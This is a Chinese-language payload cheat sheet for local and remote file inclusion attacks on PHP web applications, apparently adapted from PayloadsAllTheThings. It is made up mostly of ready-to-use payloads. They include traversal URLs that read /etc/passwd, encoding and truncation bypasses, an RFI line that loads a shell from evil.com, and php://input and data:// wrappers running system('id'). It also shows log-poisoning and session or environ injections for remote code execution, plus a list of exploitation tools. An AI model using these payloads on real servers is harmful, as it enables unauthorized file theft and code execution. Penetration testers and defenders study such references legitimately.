# File Inclusion - 文件包含

[SEARCH_KEYWORDS]
漏洞类型: File Inclusion LFI RFI 文件包含 本地文件包含 远程文件包含
攻击类型: RCE Remote Code Execution Arbitrary File Read
关键词: include require include_once require_once php:// filter wrapper
编码: Null Byte Double Encoding UTF-8 Encoding Path Truncation
技术: PHP Filter Wrapper Log Poisoning PHPInfo LFI2RCE

[CONTENT]

## 文件包含概述

文件包含漏洞是Web应用程序中的安全漏洞，攻击者可以包含文件，通常利用缺乏适当的输入/输出清理。可导致代码执行、数据窃取和网站篡改。

### LFI vs RFI

- **LFI (Local File Inclusion)**: 本地文件包含，包含服务器本地文件
- **RFI (Remote File Inclusion)**: 远程文件包含，包含远程服务器文件

## Local File Inclusion (LFI)

### 基础Payload

```powershell
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
```

### Null Byte (PHP < 5.3.4)

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

### 双重编码

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
```

### UTF-8编码

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### 路径截断

PHP文件名超过4096字节会被截断：

```powershell
http://example.com/index.php?page=../../../etc/passwd............[更多点]
http://example.com/index.php?page=../../../etc/passwd/./././././.[更多]
```

## Remote File Inclusion (RFI)

需要 `allow_url_include = On`：

```ini
allow_url_include = On
```

### 基础Payload

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### 绕过allow_url_include (Windows SMB)

```powershell
http://example.com/index.php?page=\\10.0.0.1\share\shell.php
```

## PHP Wrapper

### php://filter

```powershell
# Base64读取PHP源码
php://filter/convert.base64-encode/resource=index.php

# 读取任意文件
php://filter/read=string.rot13/resource=index.php
```

### php://input

```powershell
# POST数据执行PHP代码
?page=php://input
POST: <?php system('id'); ?>
```

### 其他Wrapper

```powershell
?page=data://text/plain,<?php system('id');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKGlkKTs/Pg==
?page=expect://id
```

## LFI to RCE

### Log Poisoning

1. 注入PHP代码到日志
2. 包含日志文件执行代码

```powershell
# Apache日志
/var/log/apache2/access.log
# 注入User-Agent: <?php system($_GET['c']); ?>

# SSH日志
/var/log/auth.log
# ssh '<?php system($_GET['c']); ?>'@target
```

### PHP Session

```powershell
# Session文件路径
/var/lib/php/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
```

### /proc/self/environ

```powershell
# 环境变量注入
User-Agent: <?php system('id'); ?>
?page=/proc/self/environ
```

## 工具

- Kadimus - LFI检测利用工具
- LFISuite - 自动LFI利用工具
- fimap - 文件包含检测审计工具
- Panoptic - 日志配置文件搜索工具
- LFImap - LFI发现利用工具

## 参考文档

原始来源: PayloadsAllTheThings/File Inclusion/README.md